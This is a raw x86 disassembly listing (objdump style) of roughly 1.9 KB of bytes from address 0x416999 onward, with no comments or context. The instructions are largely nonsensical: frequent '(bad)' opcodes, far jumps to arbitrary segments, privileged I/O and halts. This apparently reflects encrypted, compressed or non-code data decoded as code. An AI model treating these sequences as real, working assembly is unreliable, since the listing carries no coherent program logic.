  416999:	jae    0x4169b4
  41699b:	sbb    eax,0x4215d71e
  4169a0:	imul   edi,DWORD PTR [edi],0xdcf16ed8
  4169a6:	fs stos BYTE PTR es:[edi],al
  4169a8:	ret    
  4169a9:	rcr    DWORD PTR [ebp-0x16],cl
  4169ac:	loopne 0x416a1b
  4169ae:	inc    edx
  4169af:	mov    dh,0x84
  4169b1:	mov    eax,ds:0x7152affb
  4169b6:	lods   al,BYTE PTR gs:[esi]
  4169b8:	push   0xd75aac1e
  4169bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4169be:	mov    edx,0x9c02dda9
  4169c3:	adc    edi,DWORD PTR [ebp+0x25]
  4169c6:	xor    eax,0x138c7794
  4169cb:	loop   0x416967
  4169cd:	mov    ebp,0x488bb93d
  4169d2:	inc    edi
  4169d3:	and    al,bh
  4169d5:	push   es
  4169d6:	xchg   esi,eax
  4169d7:	pop    eax
  4169d8:	inc    ecx
  4169d9:	cli    
  4169da:	jp     0x4169a5
  4169dc:	mov    ebp,0x761b3d74
  4169e1:	mov    eax,DWORD PTR [eax-0x636cdaa3]
  4169e7:	ror    BYTE PTR [ebx-0x1537617f],0xeb
  4169ee:	lods   eax,DWORD PTR ds:[esi]
  4169ef:	jb     0x4169a0
  4169f1:	pop    esp
  4169f2:	cwde   
  4169f3:	fdivr  DWORD PTR [eax+0xf]
  4169f6:	ins    BYTE PTR es:[edi],dx
  4169f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4169f8:	fnsave [ebx]
  4169fa:	adc    ebp,DWORD PTR [edx+0x0]
  4169fd:	and    BYTE PTR [esi-0x544e58],ch
  416a03:	repnz rcr BYTE PTR [edx+0x50],0x7f
  416a08:	and    edi,DWORD PTR [ecx-0x2b]
  416a0b:	imul   ebp,DWORD PTR [ecx-0x48],0x62
  416a0f:	jmp    0x9abb:0xd82e4030
  416a16:	xor    eax,0x55d5d81d
  416a1b:	hlt    
  416a1c:	lds    edx,FWORD PTR [ebx]
  416a1e:	xor    cl,bl
  416a20:	inc    esi
  416a21:	mov    edx,0x8178f53e
  416a26:	out    0xfb,eax
  416a28:	lods   al,BYTE PTR ds:[esi]
  416a29:	jno    0x416a11
  416a2b:	in     eax,0xca
  416a2d:	sub    al,0xb
  416a30:	test   BYTE PTR [esp+ecx*8],dh
  416a33:	popa   
  416a34:	pushf  
  416a35:	dec    ecx
  416a36:	and    DWORD PTR [edx-0x4e],ecx
  416a39:	jne    0x4169be
  416a3b:	sbb    bh,BYTE PTR [ebx]
  416a3d:	stos   BYTE PTR es:[edi],al
  416a3e:	or     BYTE PTR [edi-0x421a050a],bh
  416a44:	dec    esi
  416a45:	cmp    eax,0xed3b8857
  416a4a:	mov    esi,0x7c17c55e
  416a4f:	push   ecx
  416a50:	out    0xdf,al
  416a52:	iret   
  416a53:	stos   BYTE PTR es:[edi],al
  416a54:	and    ecx,DWORD PTR [ecx]
  416a56:	pop    es
  416a57:	inc    eax
  416a58:	xchg   ecx,eax
  416a59:	pop    edx
  416a5a:	je     0x416a14
  416a5c:	inc    ebp
  416a5d:	fwait
  416a5e:	arpl   ax,bx
  416a60:	stc    
  416a61:	jnp    0x416a8d
  416a63:	imul   edx,esi,0xf0a8cc9
  416a69:	ins    DWORD PTR es:[edi],dx
  416a6a:	sbb    ecx,edx
  416a6c:	xchg   esp,eax
  416a6d:	test   DWORD PTR ds:0xc3fb5bba,0x4168166e
  416a77:	or     eax,0xd5a29974
  416a7c:	sub    DWORD PTR [ecx-0x13],esp
  416a7f:	jmp    0x416aed
  416a81:	ficom  DWORD PTR [edx-0x446bdd7f]
  416a87:	ret    0x797e
  416a8a:	mov    DWORD PTR [ecx+0x20],eax
  416a8d:	and    bh,BYTE PTR [edi]
  416a8f:	add    BYTE PTR [ecx],dh
  416a91:	rcr    ch,1
  416a93:	call   0xde0d:0x451cabc8
  416a9a:	stc    
  416a9b:	lock fisubr WORD PTR [esi+0x7122c70]
  416aa2:	dec    esp
  416aa3:	push   edi
  416aa4:	push   edx
  416aa5:	loope  0x416aa8
  416aa7:	retf   
  416aa8:	jmp    0xd1bc:0xf9eabba0
  416aaf:	ins    BYTE PTR es:[edi],dx
  416ab0:	cmp    eax,0xcf3d0068
  416ab5:	inc    eax
  416ab6:	in     al,0xbe
  416ab8:	mov    ds:0xf91aae78,al
  416abd:	add    BYTE PTR [ecx],cl
  416abf:	xchg   ebx,eax
  416ac0:	jl     0x416af9
  416ac2:	inc    ecx
  416ac3:	std    
  416ac4:	add    al,bh
  416ac6:	mov    edx,DWORD PTR [edi]
  416ac8:	push   ebx
  416ac9:	leave  
  416aca:	fdivr  DWORD PTR [edx-0x45cb8f4e]
  416ad0:	ins    DWORD PTR es:[edi],dx
  416ad1:	adc    DWORD PTR [ebx-0x1b],edx
  416ad4:	push   eax
  416ad5:	(bad)  
  416ad6:	fcom   QWORD PTR [edi]
  416ad8:	add    BYTE PTR [ebx+0x62],bl
  416adb:	stc    
  416adc:	sub    ah,al
  416ade:	(bad)  
  416adf:	aam    0xf7
  416ae1:	sbb    esp,ecx
  416ae3:	mov    edi,0xa521e5a9
  416ae8:	inc    edi
  416ae9:	fimul  DWORD PTR [esi]
  416aeb:	out    dx,eax
  416aec:	dec    ebp
  416aed:	icebp  
  416aee:	mov    ah,0x95
  416af0:	ror    DWORD PTR [esi+ebx*1+0x6a],cl
  416af4:	pop    edx
  416af5:	or     eax,0xaab7a0fa
  416afa:	mov    BYTE PTR [esi+ebx*4-0x1d],bh
  416afe:	pop    ebx
  416aff:	xchg   esi,eax
  416b00:	loop   0x416b44
  416b02:	and    BYTE PTR [esi+0x38],dl
  416b05:	push   ebx
  416b06:	push   ebp
  416b07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416b08:	inc    ebx
  416b09:	(bad)  
  416b0a:	outs   dx,BYTE PTR ds:[esi]
  416b0b:	std    
  416b0c:	pop    eax
  416b0d:	clc    
  416b0e:	xchg   edi,eax
  416b0f:	sbb    BYTE PTR ds:0x671e086,bh
  416b15:	pushf  
  416b16:	mov    ecx,0xcc0ba357
  416b1b:	xchg   ecx,eax
  416b1c:	repz mov ebx,0xd60ba3d6
  416b22:	ds push 0xbccc575
  416b28:	ficomp WORD PTR [edi-0x5394950d]
  416b2e:	adc    esp,esp
  416b30:	or     BYTE PTR [edx-0x19cc6589],cl
  416b36:	lds    edi,FWORD PTR [edx]
  416b38:	frndint 
  416b3a:	lock cmp DWORD PTR [eax],edx
  416b3d:	in     eax,dx
  416b3e:	lds    edx,FWORD PTR [ebx+0x5e]
  416b41:	sbb    DWORD PTR [edi-0x1b],ebx
  416b44:	mov    ebp,0x8aed1bdb
  416b49:	data16 and ah,dl
  416b4c:	mov    ebx,0xc1773f08
  416b51:	xchg   ebx,eax
  416b52:	dec    ebp
  416b53:	adc    BYTE PTR [ecx-0x58],al
  416b56:	js     0x416b3c
  416b58:	xchg   esp,eax
  416b59:	adc    al,0xbc
  416b5b:	push   ebp
  416b5c:	adc    DWORD PTR [esi+0x7e53c1c5],eax
  416b62:	pop    edx
  416b63:	lock hlt 
  416b65:	mov    bh,0xae
  416b67:	test   eax,0x9bec662a
  416b6c:	pop    ebp
  416b6d:	xchg   eax,eax
  416b6f:	mov    eax,ds:0x825bf7cb
  416b74:	fisubr WORD PTR [eax+0x7d11d83c]
  416b7a:	in     al,dx
  416b7b:	outs   dx,DWORD PTR ds:[esi]
  416b7c:	(bad)  
  416b7e:	leave  
  416b7f:	cmp    al,0xc5
  416b81:	inc    eax
  416b82:	jmp    0xb122:0xb19478dd
  416b89:	shl    dh,cl
  416b8b:	push   es
  416b8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b8d:	enter  0xfaf,0xaa
  416b91:	loope  0x416b37
  416b93:	mov    ebp,0x88c530ff
  416b98:	fsubrp st(3),st
  416b9a:	jmp    0x416b44
  416b9c:	mov    esi,0x17ced753
  416ba1:	imul   edi,DWORD PTR [eax-0x3e3bad08],0xb0b5d99e
  416bab:	mov    eax,ds:0x5a088512
  416bb0:	retf   
  416bb1:	and    BYTE PTR [edi+0xb15567f],0xe6
  416bb8:	aam    0x5b
  416bba:	mov    bl,dh
  416bbc:	adc    eax,0x10b30665
  416bc1:	sub    bl,BYTE PTR [edx+eax*2+0x2c17fd91]
  416bc8:	andps  xmm2,XMMWORD PTR [eax]
  416bcb:	sbb    al,0xf6
  416bcd:	and    cl,al
  416bcf:	xor    eax,0x83c22b9a
  416bd4:	cmc    
  416bd5:	adc    eax,DWORD PTR ds:0xd628f082
  416bdb:	lods   eax,DWORD PTR ds:[esi]
  416bdc:	and    BYTE PTR [eax],0xff
  416bdf:	cmp    ch,bl
  416be1:	push   es
  416be2:	xchg   esi,eax
  416be3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416be4:	fisttp DWORD PTR [ebp-0xd7c43ac]
  416bea:	or     eax,esp
  416bec:	xchg   BYTE PTR [ebx],ch
  416bee:	fsub   QWORD PTR [ecx-0x69]
  416bf1:	mov    ebx,0x14de75bf
  416bf6:	sub    BYTE PTR [ebp+0x10],0x61
  416bfa:	or     DWORD PTR [eax],eax
  416bfc:	or     eax,DWORD PTR [ebx+0x74]
  416bff:	cmp    ecx,DWORD PTR [esi-0x54]
  416c02:	bound  ebx,QWORD PTR [esi-0x3698f0d5]
  416c08:	fs jne 0x416c3c
  416c0b:	ds ret 
  416c0d:	shl    BYTE PTR [ebp-0x1e1cd11],0xb0
  416c14:	int3   
  416c15:	ja     0x416c67
  416c17:	push   eax
  416c18:	aam    0xe1
  416c1a:	js     0x416c86
  416c1c:	clc    
  416c1d:	inc    esi
  416c1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c1f:	scas   al,BYTE PTR es:[edi]
  416c20:	jecxz  0x416bf8
  416c22:	inc    eax
  416c23:	push   edi
  416c24:	xchg   DWORD PTR [ecx],esp
  416c26:	into   
  416c27:	pop    ss
  416c28:	imul   eax,DWORD PTR [ebx],0x3f
  416c2b:	stos   BYTE PTR es:[edi],al
  416c2c:	push   es
  416c2d:	test   al,0xa8
  416c2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c30:	add    BYTE PTR [eax+0x284dd6a5],ah
  416c36:	ins    DWORD PTR es:[edi],dx
  416c37:	push   0x37c910f9
  416c3c:	aam    0x16
  416c3e:	xchg   DWORD PTR [ecx],ebp
  416c40:	sub    ebp,ebp
  416c42:	jmp    0xab40:0x81271cd
  416c49:	jmp    0x416c57
  416c4b:	dec    ebp
  416c4c:	add    ch,BYTE PTR [edi+0x517da645]
  416c52:	addr16 xchg esi,eax
  416c54:	mov    edx,0x4dd7b72c
  416c59:	push   0xffffff8b
  416c5b:	and    cl,bh
  416c5d:	shl    DWORD PTR [edx+0x6c],1
  416c60:	pop    es
  416c61:	sbb    ah,bh
  416c63:	leave  
  416c64:	cmp    eax,0xbd107600
  416c69:	xor    al,0x25
  416c6b:	out    0xe,eax
  416c6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c6e:	lock fistp QWORD PTR [esi+0x2979e586]
  416c75:	int3   
  416c76:	push   esp
  416c77:	inc    ebp
  416c78:	cwde   
  416c79:	stc    
  416c7a:	call   0x1289e204
  416c7f:	xchg   esp,eax
  416c80:	add    eax,0xbd115cb2
  416c85:	ret    
  416c86:	loop   0x416c7e
  416c88:	xor    eax,ebp
  416c8a:	push   ecx
  416c8b:	fistp  WORD PTR [edx]
  416c8d:	cmc    
  416c8e:	xor    dl,BYTE PTR [esi]
  416c90:	jae    0x416cb0
  416c92:	in     al,dx
  416c93:	clc    
  416c94:	sub    DWORD PTR [ecx],eax
  416c96:	push   esp
  416c97:	cmp    ah,BYTE PTR [edi-0x459ddb28]
  416c9d:	mov    bl,0x8e
  416c9f:	sub    bh,BYTE PTR [edi-0x30]
  416ca2:	xchg   edx,eax
  416ca3:	adc    dl,BYTE PTR [edi]
  416ca5:	push   ebx
  416ca6:	mov    esi,DWORD PTR [eax+edx*8+0x6f]
  416caa:	std    
  416cab:	aas    
  416cac:	pop    es
  416cad:	fisubr WORD PTR [ebx+ecx*1-0x8]
  416cb1:	jge    0x416d30
  416cb3:	mov    esi,0xc78072f6
  416cb8:	cs fwait
  416cba:	out    0x21,eax
  416cbc:	leave  
  416cbd:	retf   0x271c
  416cc0:	jp     0x416cbf
  416cc2:	fistp  DWORD PTR [esi-0x4e]
  416cc5:	rol    DWORD PTR [ecx-0x6],1
  416cc8:	add    eax,DWORD PTR [edi]
  416cca:	add    ah,BYTE PTR [edi-0xb]
  416ccd:	mov    es,WORD PTR [edx+0x2c]
  416cd0:	pop    ebx
  416cd1:	jge    0x416d3e
  416cd3:	out    0xbf,al
  416cd5:	push   edx
  416cd6:	adc    eax,0x7b6375d9
  416cdb:	clc    
  416cdc:	inc    edi
  416cdd:	and    eax,0xc544f6e
  416ce2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416ce3:	gs sub eax,0x9a901ad4
  416ce9:	(bad)  
  416cea:	sar    BYTE PTR [ebx-0x514a6fd8],cl
  416cf0:	(bad)
  416cf4:	or     al,0xdf
  416cf6:	xor    ebp,esi
  416cf8:	shl    BYTE PTR [ebp+0x7e],0x27
  416cfc:	push   esi
  416cfd:	mov    ds:0x9e48a79b,eax
  416d02:	cmp    ecx,DWORD PTR [esi-0x3a]
  416d05:	cmp    al,0x83
  416d07:	xchg   edx,eax
  416d08:	out    0x27,eax
  416d0a:	xor    ebp,DWORD PTR [ebp+0x76]
  416d0d:	lahf   
  416d0e:	sbb    bl,cl
  416d10:	xchg   ebx,eax
  416d11:	or     al,0xd3
  416d13:	stc    
  416d14:	enter  0x1734,0xdc
  416d18:	(bad)  
  416d1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416d1b:	call   DWORD PTR [edx-0xf233cc4]
  416d21:	(bad)
  416d25:	adc    esi,esp
  416d27:	(bad)  
  416d28:	adc    DWORD PTR [edx-0x338b3671],ebp
  416d2e:	outs   dx,DWORD PTR ds:[esi]
  416d2f:	int    0x94
  416d31:	ss inc ebp
  416d33:	out    dx,eax
  416d34:	push   ds
  416d35:	(bad)  
  416d37:	adc    al,0x50
  416d3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416d3b:	out    0xe8,al
  416d3d:	pop    edi
  416d3e:	push   edx
  416d3f:	test   eax,0xb11c7902
  416d44:	pxor   mm4,mm6
  416d47:	and    BYTE PTR [edx+ecx*2+0x5bf2d78e],0xe2
  416d4f:	mov    cl,0xd5
  416d51:	in     al,0xab
  416d53:	push   ebx
  416d54:	pop    ebp
  416d55:	fsubr  DWORD PTR [edi]
  416d57:	pop    edx
  416d58:	xchg   BYTE PTR [eax],dl
  416d5a:	(bad)  
  416d5b:	add    ah,BYTE PTR [esi+edi*1-0x350afc0b]
  416d62:	mov    esp,0xd07e3e9e
  416d67:	mov    ds:0x3153d6af,eax
  416d6c:	call   0x4302:0xa270265f
  416d73:	lock jmp 0x83ac2638
  416d79:	stos   BYTE PTR es:[edi],al
  416d7a:	mov    ch,0xdf
  416d7c:	iret   
  416d7d:	cdq    
  416d7e:	push   ebx
  416d7f:	jae    0x416df8
  416d81:	and    al,0x47
  416d83:	shl    DWORD PTR [edi],cl
  416d85:	(bad)  
  416d86:	ss adc al,0x9b
  416d89:	cmp    al,0xb2
  416d8b:	(bad)  
  416d8c:	stc    
  416d8d:	in     al,0x93
  416d8f:	test   al,0x4c
  416d91:	adc    esi,edx
  416d93:	add    al,0xea
  416d95:	add    eax,0xc0ef87
  416d9a:	jb     0x416d20
  416d9c:	ficom  DWORD PTR [eax-0x63]
  416d9f:	xchg   esp,eax
  416da0:	(bad)  
  416da1:	hlt    
  416da2:	mov    edi,0x5b029c19
  416da7:	adc    al,0x52
  416da9:	sub    eax,DWORD PTR ds:0x5e4c6712
  416daf:	test   bh,0x45
  416db2:	mov    DWORD PTR [ebx+esi*8],eax
  416db5:	jmp    0x4c38:0x9809ef37
  416dbc:	mov    eax,0x2a0e413a
  416dc1:	add    BYTE PTR [ecx-0x4d6c2362],ch
  416dc7:	out    0x50,al
  416dc9:	mov    eax,0x9cdefb52
  416dce:	mov    dl,BYTE PTR [edx-0x73682237]
  416dd4:	test   al,0x70
  416dd6:	mov    ecx,ecx
  416dd8:	sub    cl,ah
  416dda:	inc    ebp
  416ddb:	inc    esp
  416ddc:	or     DWORD PTR [esi-0x24bf798d],edx
  416de2:	push   ecx
  416de3:	xchg   ebx,eax
  416de4:	lds    edi,FWORD PTR [eax-0x231616b2]
  416dea:	(bad)  
  416deb:	iret   
  416dec:	xchg   edi,eax
  416ded:	jp     0x416e21
  416def:	dec    esi
  416df0:	std    
  416df1:	je     0x416ddc
  416df3:	dec    edi
  416df4:	or     dl,cl
  416df6:	push   ecx
  416df7:	mov    dh,0x6
  416df9:	jbe    0x416d98
  416dfb:	dec    ebp
  416dfc:	add    ah,BYTE PTR [ecx]
  416dfe:	push   ss
  416dff:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  416e01:	sub    edi,ecx
  416e03:	iret   
  416e04:	or     DWORD PTR [ebx],0x19
  416e07:	aas    
  416e08:	sahf   
  416e09:	adc    esi,ebx
  416e0b:	ss aas 
  416e0d:	aam    0x29
  416e0f:	mov    ecx,fs
  416e11:	push   edx
  416e12:	sar    esp,0x5f
  416e15:	inc    ebx
  416e16:	or     eax,0xec861525
  416e1b:	and    eax,0x1980295
  416e20:	cmc    
  416e21:	or     dh,ah
  416e23:	xchg   BYTE PTR [ecx+0x5c5ee9bf],bl
  416e29:	add    DWORD PTR [ecx],esi
  416e2b:	inc    edx
  416e2c:	adc    eax,0xd55b9bda
  416e31:	xor    DWORD PTR [esi],edi
  416e33:	push   eax
  416e34:	or     BYTE PTR [ebp+0xe],ah
  416e37:	xchg   DWORD PTR ds:0x5a1641a3,edi
  416e3d:	loop   0x416dec
  416e3f:	inc    edi
  416e40:	inc    ecx
  416e41:	cld    
  416e42:	jmp    0x4187:0x777474e4
  416e49:	sub    cl,bh
  416e4b:	inc    esi
  416e4c:	leave  
  416e4d:	sbb    bh,BYTE PTR [ebx]
  416e4f:	adc    bl,BYTE PTR [edx]
  416e51:	mov    BYTE PTR [eax+0x1ac8921e],bl
  416e57:	bound  ecx,QWORD PTR [esi+eiz*1+0x24450d81]
  416e5e:	push   ebp
  416e5f:	mov    ecx,DWORD PTR [ecx+0x3]
  416e62:	xchg   al,ah
  416e64:	nop
  416e65:	rol    BYTE PTR [eax+0x4629dd16],cl
  416e6b:	mov    ecx,0x76bfe7bd
  416e70:	dec    ebx
  416e71:	or     edx,DWORD PTR [eax-0x16]
  416e74:	mov    cl,0x6d
  416e76:	addr16 jnp 0x416e9b
  416e79:	call   0x10e9b782
  416e7e:	imul   ecx,DWORD PTR [ecx],0x890ae3a8
  416e84:	ror    BYTE PTR ds:0x5669dc60,cl
  416e8a:	push   ecx
  416e8b:	scas   eax,DWORD PTR es:[edi]
  416e8c:	jg     0x416e95
  416e8e:	inc    eax
  416e8f:	mov    esp,0x77a60c11
  416e94:	mov    cl,0xbb
  416e96:	clc    
  416e97:	or     al,0x99
  416e99:	outs   dx,DWORD PTR ds:[esi]
  416e9a:	and    edi,DWORD PTR [ebx+0x74aff747]
  416ea0:	push   es
  416ea1:	dec    esp
  416ea2:	push   ds
  416ea3:	xchg   DWORD PTR [ecx-0x53c848e5],edi
  416ea9:	dec    esp
  416eaa:	pop    ebp
  416eab:	push   ds
  416eac:	adc    dh,BYTE PTR [ebx-0xa9d5c21]
  416eb2:	pop    ebp
  416eb3:	dec    esi
  416eb4:	popf   
  416eb5:	xchg   ebp,eax
  416eb6:	test   BYTE PTR [ebx-0x4aa31b2b],0xf8
  416ebd:	clc    
  416ebe:	loope  0x416e53
  416ec0:	ror    BYTE PTR [esi-0x3f],0xca
  416ec4:	mov    edx,DWORD PTR [edx+0x4f5a3265]
  416eca:	push   ds
  416ecb:	sbb    edx,DWORD PTR [edi+eiz*1-0x44]
  416ecf:	add    eax,0x37d6e1b2
  416ed4:	fiadd  WORD PTR [eax-0x426d6f6d]
  416eda:	scas   al,BYTE PTR es:[edi]
  416edb:	jge    0x416e8c
  416edd:	dec    ebx
  416ede:	xchg   edx,eax
  416edf:	xchg   ebx,eax
  416ee0:	pusha  
  416ee1:	sub    dh,dl
  416ee3:	daa    
  416ee4:	mov    ebp,0x8d67ec6f
  416ee9:	icebp  
  416eea:	int    0xe9
  416eec:	or     dl,bl
  416eee:	xchg   ebp,eax
  416eef:	outs   dx,BYTE PTR ds:[esi]
  416ef0:	mov    ebp,0x55d9e443
  416ef5:	int    0x60
  416ef7:	in     eax,0x52
  416ef9:	jo     0x416e92
  416efb:	mov    ebp,0x5130ae28
  416f00:	and    eax,esp
  416f02:	cmp    eax,0x62493f82
  416f07:	jo     0x416ea6
  416f09:	or     ebp,DWORD PTR [eax-0x63081803]
  416f0f:	(bad)  
  416f10:	sti    
  416f11:	inc    esi
  416f12:	push   DWORD PTR [edx]
  416f14:	scas   eax,DWORD PTR es:[edi]
  416f15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f16:	mov    eax,ds:0xbd2b5ce3
  416f1b:	xchg   edx,eax
  416f1c:	out    0x94,eax
  416f1e:	test   al,0xfd
  416f20:	mov    WORD PTR [ecx-0x42071e31],gs
  416f26:	xor    esi,DWORD PTR [ebx]
  416f28:	popa   
  416f29:	dec    esp
  416f2a:	fs sub al,0x20
  416f2d:	jb     0x416f88
  416f2f:	jae    0x416ee3
  416f31:	cmp    dl,BYTE PTR [esi+0x71]
  416f34:	jmp    0xa690f8f3
  416f39:	int    0xa2
  416f3b:	xchg   DWORD PTR [ecx+ecx*1+0x71],ecx
  416f3f:	into   
  416f40:	cld    
  416f41:	cmp    BYTE PTR [eax+0x7],dl
  416f44:	fld    DWORD PTR [ebx+eiz*4-0x58]
  416f48:	jl     0x416f32
  416f4a:	cdq    
  416f4b:	and    dh,BYTE PTR [ecx+0x46]
  416f4e:	clc    
  416f4f:	pop    edi
  416f50:	pop    edx
  416f51:	std    
  416f52:	mov    esi,eax
  416f54:	hlt    
  416f55:	in     al,0xa7
  416f57:	add    esi,DWORD PTR [edx-0x5f]
  416f5a:	push   0x1ad5e6b
  416f5f:	pop    edi
  416f60:	rcr    BYTE PTR [ebp+0x7d83a7f0],0x80
  416f67:	shl    BYTE PTR [ebx-0xa6013e9],cl
  416f6d:	ret    0xcffb
  416f70:	dec    ebx
  416f71:	push   eax
  416f72:	das    
  416f73:	pop    ss
  416f74:	call   0xa4da:0xc51434e8
  416f7b:	sub    ecx,DWORD PTR [eax+0x7]
  416f7e:	(bad)  
  416f7f:	jmp    0x416f7f
  416f81:	pop    edi
  416f82:	scas   al,BYTE PTR es:[edi]
  416f83:	shr    DWORD PTR [ecx+0x3],1
  416f86:	bound  eax,QWORD PTR [ebx+0x6ceddae8]
  416f8c:	mov    BYTE PTR [ebx],bh
  416f8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f8f:	mov    ch,0xd1
  416f91:	fcom   DWORD PTR [ebp-0x4b72c907]
  416f97:	jno    0x416fa6
  416f99:	pop    edx
  416f9a:	fxch   st(4)
  416f9c:	daa    
  416f9d:	int3   
  416f9e:	mov    al,ds:0xa37be1b
  416fa3:	stos   BYTE PTR es:[edi],al
  416fa4:	iret   
  416fa5:	imul   edi,DWORD PTR [esi-0x3],0x924f6388
  416fac:	mov    bh,BYTE PTR [eax+0x1a]
  416faf:	mov    ebp,0x5c2ecf0d
  416fb4:	push   ebx
  416fb5:	cmp    ebp,ebp
  416fb7:	jp     0x417010
  416fb9:	xlat   BYTE PTR ds:[ebx]
  416fba:	xor    DWORD PTR [ebx-0x26],eax
  416fbd:	retf   0xcf32
  416fc0:	repnz xchg edi,eax
  416fc2:	jp     0x416fd2
  416fc4:	xchg   ecx,eax
  416fc5:	(bad)  
  416fc6:	xor    BYTE PTR [ecx],dl
  416fc8:	xchg   edx,eax
  416fc9:	ss sbb al,0x77
  416fcc:	gs add eax,0x813b2a51
  416fd2:	fs jb  0x416fd0
  416fd5:	scas   eax,DWORD PTR es:[edi]
  416fd6:	jns    0x416fdf
  416fd8:	sahf   
  416fd9:	jmp    0x8930536e
  416fde:	add    edi,eax
  416fe0:	ret    
  416fe1:	dec    ecx
  416fe2:	test   BYTE PTR [eax],ah
  416fe4:	cmc    
  416fe5:	into   
  416fe6:	push   cs
  416fe7:	adc    bl,BYTE PTR [edx]
  416fe9:	icebp  
  416fea:	adc    BYTE PTR [esi+ecx*8+0x74c15cbd],bh
  416ff1:	cdq    
  416ff2:	mov    ebp,0xab0dfc45
  416ff7:	addr16 push esp
  416ff9:	mov    edx,DWORD PTR [ebx-0x6b7d507a]
  416fff:	jo     0x416f96
  417001:	cmp    ebx,ebp
  417003:	dec    edi
  417004:	jbe    0x416fb1
  417006:	dec    ebx
  417007:	das    
  417008:	sbb    ch,BYTE PTR [eax-0x5d]
  41700b:	inc    eax
  41700c:	xchg   esp,esi
  41700e:	adc    cl,BYTE PTR [ebx+esi*2+0x2b]
  417012:	hlt    
  417013:	les    esi,FWORD PTR [edi+0x217b9187]
  417019:	loop   0x417059
  41701b:	push   ebx
  41701c:	add    ecx,DWORD PTR [edx]
  41701e:	and    al,0x5
  417020:	dec    ebp
  417021:	xchg   ebx,eax
  417022:	cmp    dl,cl
  417024:	hlt    
  417025:	push   edx
  417026:	sub    cl,BYTE PTR [ecx+edi*2]
  417029:	xor    ah,BYTE PTR [ebp+0x6d]
  41702c:	jp     0x416fb8
  41702e:	push   edx
  41702f:	lahf   
  417030:	xchg   esp,eax
  417031:	movnti DWORD PTR [ecx],edi
  417034:	sub    ah,BYTE PTR [eax]
  417036:	add    al,0x7d
  417038:	sbb    al,BYTE PTR [ecx+0x57f0922d]
  41703e:	sub    al,0x4a
  417040:	mov    bh,0x5e
  417042:	rcl    BYTE PTR [esi],1
  417044:	das    
  417045:	fist   DWORD PTR [edx+0x1e7989a4]
  41704b:	sahf   
  41704c:	sub    al,BYTE PTR [ecx-0x19]
  41704f:	xchg   esp,eax
  417050:	dec    ebp
  417051:	cmp    eax,0x50cde6d8
  417056:	mov    esp,0x52c1ffdb
  41705b:	je     0x4170b8
  41705d:	cld    
  41705e:	aas    
  41705f:	add    al,0x5d
  417061:	sub    ebp,0x36
  417064:	mov    ebx,0xde66d159
  417069:	test   al,0x28
  41706b:	push   cs
  41706c:	fcmovb st,st(5)
  41706e:	test   esp,edi
  417070:	xchg   esi,eax
  417071:	aaa    
  417072:	mov    ebp,cs
  417074:	mov    ecx,0xc430b604
  417079:	xchg   esp,eax
  41707a:	nop
  41707b:	fwait
  41707c:	inc    eax
  41707d:	icebp  
  41707e:	inc    edx
  41707f:	add    al,BYTE PTR [edi+ecx*2]
  417082:	sbb    ch,BYTE PTR gs:[edi+0x6f]
  417086:	and    eax,0x7fb071b4
  41708b:	xchg   ebp,eax
  41708c:	xor    bl,BYTE PTR [ebx]
  41708e:	push   esi
  41708f:	jmp    0xec40:0xbdce6360
  417096:	dec    edx
  417097:	gs js  0x4170f1
  41709a:	mov    esi,0xed558025
  41709f:	cdq    
  4170a0:	add    ecx,DWORD PTR [edi+0x159e583]
  4170a6:	repz clc 
  4170a8:	xor    edx,0x7d
  4170ab:	cdq    
  4170ac:	cmp    bl,BYTE PTR [edx+0x44]
  4170af:	mov    BYTE PTR [edi-0x4b],cl
  4170b2:	mov    al,0x1
  4170b4:	pop    edx
  4170b5:	lahf   
  4170b6:	imul   eax,DWORD PTR ds:0xa1c98adc,0x43f91b62
  4170c0:	enter  0x81bc,0x9
  4170c4:	outs   dx,BYTE PTR ds:[esi]
  4170c5:	popf   
  4170c6:	mov    dl,BYTE PTR [ecx+0x52]
  4170c9:	mov    bl,0x64
  4170cb:	jge    0x4170e8
  4170cd:	jne    0x417105
  4170cf:	int    0x64
  4170d1:	adc    bl,bl
  4170d3:	cmp    al,0xb3
  4170d5:	pop    esi
  4170d6:	or     eax,0xd1596ea4
  4170db:	lea    edx,[ebp+0x1]
  4170de:	adc    BYTE PTR [edi-0x8],cl
  4170e1:	outs   dx,DWORD PTR ds:[esi]
  4170e2:	out    dx,eax
  4170e3:	out    0x7c,eax
  4170e5:	test   al,0xfb
  4170e7:	inc    edx
  4170e8:	add    al,0x3b
  4170ea:	or     DWORD PTR [eax-0x31],esp
  4170ed:	leave  
  4170ee:	dec    esp
  4170ef:	cmp    al,0x4d
  4170f1:	sbb    BYTE PTR [esi],ch
  4170f3:	pop    ebp
  4170f4:	mov    ebp,0x72669f32
  4170f9:	or     bl,bh
  4170fb:	ss jmp esp
  4170fe:	xor    al,0xdb
  417100:	les    ecx,FWORD PTR [edi+0x56]
  417103:	rcl    DWORD PTR ds:0xfd089133,1
  417109:	or     cl,ch
  41710b:	mov    bh,0xe7
  41710d:	(bad)  
  41710f:	mov    bl,0xcb
  417111:	xchg   ecx,eax
  417112:	push   0x28
  417114:	adc    al,0x5
  417116:	adc    BYTE PTR [ebx+0x2f3c5e02],0x85
  41711d:	add    BYTE PTR [edx+0x1699f37],bl
  417123:	mov    bh,0xfc
  417125:	mov    dh,0xdf
  417127:	test   DWORD PTR [esi-0x3ba56fb2],eax
  41712d:	pushf  
  41712e:	cmp    al,0xf6
  417130:	or     ebp,DWORD PTR [edx]
  417132:	call   DWORD PTR ds:[edx-0x4e]
  417137:	mov    edx,0xf0483133
  41713c:	call   0xfaf1:0xa8881b9f
  417143:	scas   eax,DWORD PTR es:[edi]
  417144:	hlt    
  417145:	add    al,0x0
  417147:	outs   dx,DWORD PTR ds:[esi]
